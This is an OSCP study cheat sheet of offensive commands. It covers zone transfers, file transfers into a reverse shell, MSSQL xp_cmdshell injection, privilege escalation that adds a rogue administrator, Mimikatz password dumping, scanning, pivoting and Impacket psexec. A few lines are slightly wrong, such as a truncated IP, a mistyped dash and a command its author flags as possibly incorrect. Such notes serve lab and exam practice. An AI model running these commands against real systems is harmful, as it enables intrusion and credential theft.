# JustTryHarder
Just Try Harder and pass the OSCP!



Active Directory & Domain Controllers
----------------
- http://web.archive.org/web/20141004091538/http://www.slaughterjames.com/blog/2012/10/23/hacking-a-domain-controller-part-1-enumeration.html

- http://web.archive.org/web/20160417135414/http://www.slaughterjames.com/blog/2012/10/30/hacking-a-domain-controller-part-2-easy-pwnage.html

DNS - Zone Transfers
----------------
host -t axfr test.local 10.10.10.10

host -l test.local 10.10.10.10

File Transfers
----------------
Wget Transfer
How to retrieve file(s) from host (inside a reverse shell)

	1. Place file you want transferred in /var/www/html/
	2. # service apache2 start
	3. # wget http://10.10.10/pspy64 <- for single file
  	4. # wget -r http://10.10.10.10/pspy64/ <- for folder

MSSQL
----------------
- EXEC master..xp_cmdshell 'whoami';
- meh' exec master..xp_cmdshell 'whoami' --

Priv Esc - Linux
----------------
- grep -Ri 'password' .
- find / -perm –4000 2>/dev/null
- find / -user root -perm -4000 -exec ls -ldb {} \;

Priv Esc - Windows
----------------
 - c:\Inetpub>churrasco -d "net user /add <username> <password>"
 - c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
 - c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

Post Exploitation
----------------
Mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

Port Scanning
----------------
reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames

nmap -sT -sU -p- --min-rate 10000
nmap -sT -sU -p <open ports seperated by ,'s> -A
obviously drop -sU if no UDP ports are open
- TCP
nmap -p- -iL ips.txt > AllTCPPorts.txt 
 
- UDP (can take hours so maybe netstat is a better alternative)
nmap -p- -sU -iL ips.txt > udp.txt 
nmap -sU -sV -iL ips.txt > alludpports.txt 
 
- SNMP
nmap -p161 -sU -iL ips.txt > udp.txt  (cmd could be wrong, double check)
 
- SSH
nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt 
 
- SSL
nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 

Pivoting
----------------
sshuttle -r user@10.10.10.10 10.1.1.0/24

Shell Upgrading
----------------
- In reverse shell

1. python -c 'import pty; pty.spawn("/bin/bash")'
2. Ctrl-Z

- In Kali

3. stty raw -echo
4. fg

- In reverse shell
5. reset (sometimes optional)
6. export SHELL=bash
7. export TERM=xterm-256color
8. stty rows <num> columns <cols> (optional)

Show listening ports
----------------
- Linux netstat syntax
netstat -tulpn | grep LISTEN

- FreeBSD/MacOS X netstat syntax
netstat -anp tcp | grep LISTEN
netstat -anp udp | grep LISTEN

- OpenBSD netstat syntax

	netstat -na -f inet | grep LISTEN
	netstat -nat | grep LISTEN

	

	

- Nmap scan syntax
sudo nmap -sT -O localhost
sudo nmap -sU -O 192.168.2.13 ##[ list open UDP ports ]##
sudo nmap -sT -O 192.168.2.13 ##[ list open TCP ports ]##

SMB - Impacket
----------------
- Impacket's PSEXEC
/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10

Password: (password)
[*] Trying protocol 445/SMB...

- Impacket's SMBServer
cd /usr/share/windows-binaries
python /usr/share/doc/python-impacket/examples/smbserver.py a .


